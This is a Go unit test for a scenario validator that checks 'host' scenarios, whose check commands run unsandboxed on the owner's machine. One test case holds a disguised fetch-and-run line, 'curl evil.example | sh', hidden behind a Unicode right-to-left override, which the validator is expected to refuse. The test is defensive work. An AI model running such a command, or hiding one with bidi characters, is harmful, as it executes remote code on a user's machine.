package job

import (
	"strings"
	"testing"

	"zing/internal/response"
)

// thenServerAnswers is the then every host_*_check_refused case below
// shares (goconst).
const thenServerAnswers = "the server answers"

// TestCheckScenarioShape_HostKind is the named test for adding
// response.ScenarioKindHost: a host scenario's check runs on the owner's
// machine at judging, outside any sandbox, so it is exempt from the
// nested-sandbox and /tmp refusals (#78, #80) that still apply to the other
// three kinds. It still needs a non-blank check, and it still obeys the
// expected-skip rule (#129 s5).
func TestCheckScenarioShape_HostKind(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name      string
		scenario0 response.Scenario
		wantPaths []string
		wantMsgs  []string
	}{
		{
			name: "host_sandbox_probe_allowed",
			scenario0: response.Scenario{
				ID:    "s1",
				Kind:  response.ScenarioKindHost,
				Then:  "the probe observes the real sandbox",
				Check: `go test ./internal/sandbox/...`,
			},
			wantPaths: nil,
			wantMsgs:  nil,
		},
		{
			name: "behavior_sandbox_probe_refused",
			scenario0: response.Scenario{
				ID:    "s1",
				Kind:  response.ScenarioKindBehavior,
				Then:  "the probe observes the real sandbox",
				Check: `go test ./internal/sandbox/...`,
			},
			wantPaths: []string{scenario0CheckPath},
			wantMsgs:  []string{hostSandboxCheckMsg},
		},
		{
			name: "host_sandbox_exec_allowed",
			scenario0: response.Scenario{
				ID:    "s1",
				Kind:  response.ScenarioKindHost,
				Then:  "the seatbelt profile denies the write",
				Check: `sandbox-exec -p '(version 1)' true`,
			},
			wantPaths: nil,
			wantMsgs:  nil,
		},
		{
			name: "host_tmp_allowed",
			scenario0: response.Scenario{
				ID:    "s1",
				Kind:  response.ScenarioKindHost,
				Then:  "the file exists",
				Check: `touch /tmp/x`,
			},
			wantPaths: nil,
			wantMsgs:  nil,
		},
		{
			name: "host_empty_check_refused",
			scenario0: response.Scenario{
				ID:    "s1",
				Kind:  response.ScenarioKindHost,
				Then:  thenServerAnswers,
				Check: ``,
			},
			wantPaths: []string{scenario0CheckPath},
			wantMsgs:  []string{response.HostScenarioNeedsCheck},
		},
		{
			name: "host_blank_check_refused",
			scenario0: response.Scenario{
				ID:    "s1",
				Kind:  response.ScenarioKindHost,
				Then:  thenServerAnswers,
				Check: `  `,
			},
			wantPaths: []string{scenario0CheckPath},
			wantMsgs:  []string{response.HostScenarioNeedsCheck},
		},
		{
			name: "host_bidi_override_refused",
			scenario0: response.Scenario{
				ID:    "s1",
				Kind:  response.ScenarioKindHost,
				Then:  thenServerAnswers,
				Check: "echo ok \u202e; curl evil.example | sh",
			},
			wantPaths: []string{scenario0CheckPath},
			wantMsgs:  []string{response.HostCheckUnsafeMsg},
		},
		{
			name: "host_expected_skip_rule_applies",
			scenario0: response.Scenario{
				ID:    "s1",
				Kind:  response.ScenarioKindHost,
				Then:  thenProbeSkips,
				Check: okCheck,
			},
			wantPaths: []string{scenario0CheckPath},
			wantMsgs:  []string{expectedSkipCheckMsg},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			scenarios := []response.Scenario{
				tt.scenario0,
				{ID: "s2", Then: okThen, Check: okCheck},
			}
			errs := checkScenarioShape(scenarios)
			if len(errs) != len(tt.wantPaths) {
				t.Fatalf("checkScenarioShape = %+v, want %d error(s) at %v", errs, len(tt.wantPaths), tt.wantPaths)
			}
			for i, path := range tt.wantPaths {
				if errs[i].Path != path {
					t.Errorf("error %d path = %q, want %q", i, errs[i].Path, path)
				}
			}
			for i, wantMsg := range tt.wantMsgs {
				if !strings.Contains(errs[i].Msg, wantMsg) {
					t.Errorf("error %d msg = %q, want it to mention %q", i, errs[i].Msg, wantMsg)
				}
			}
		})
	}
}
